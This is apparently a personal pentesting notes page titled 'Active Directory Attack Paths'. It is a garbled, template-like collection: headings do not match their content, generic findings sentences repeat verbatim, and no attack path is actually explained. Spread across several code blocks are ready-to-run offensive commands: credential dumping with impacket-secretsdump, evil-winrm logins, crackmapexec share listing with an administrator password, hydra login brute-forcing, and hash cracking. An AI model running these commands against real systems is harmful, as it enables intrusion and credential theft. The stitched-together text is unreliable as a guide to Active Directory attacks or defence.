---
TitleSEO: "Active Directory Attack Paths | ZureFX"
TitlePost: "Active Directory Attack Paths"
Author: "ZureFX"
Description: "Personal notes on Active Directory Attack Paths. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, oscp, blue team, windows"
URL: "https://zurefx.github.io/notes/note-active-directory-attack-paths-504.html"
URL_IMAGES: ""
Date: "2025-12-26"
Tags: "DFIR, OSCP, Blue Team, Windows"
Section: "notes"
Lang: "en"
main_img: "note-active-directory-attack-paths-504"
Permalink: "/notes/note-active-directory-attack-paths-504.html"
BtnLabel: "Read Notes"
Pick: 0
---
## ldapsearch

### netcat

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
gobuster dir -u http://10.16.129.1/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.144.176/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

## Ruby on Rails

### ACL Abuse

```bash
gobuster dir -u http://10.108.214.18/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.126.114.27
```

- `Writable PATH`
- `crackmapexec`
- `burpsuite`
- `netcat`
- `psexec`
- `AlwaysInstallElevated`

```powershell
evil-winrm -i 10.70.194.7 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.174.130
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.189.124
```

```bash
crackmapexec smb 10.56.88.162 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.166.125
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

## CMD

### SSTI

> **Note:** Insecure Deserialization was identified as the primary attack vector in this scenario.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.176.232 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
nmap -sCV -p993,3306,464 10.87.238.97 -oN scan.txt
```

## socat

### sqlmap

```bash
crackmapexec smb 10.87.99.209 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.88.57.8/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.32.122.65 -u administrator -p 'P@ssw0rd!' --shares
```

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

- `GPP Password`
- `ligolo-ng`
- `kerbrute`
- `Weak Service Permissions`
- `evil-winrm`

## LXD Privilege Escalation

### crackmapexec

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.106.21
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.11.188.124/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.116.146 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.127.44.180 -u administrator -p 'P@ssw0rd!' --shares
```

- `nikto`
- `sqlmap`
- `AlwaysInstallElevated`

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.
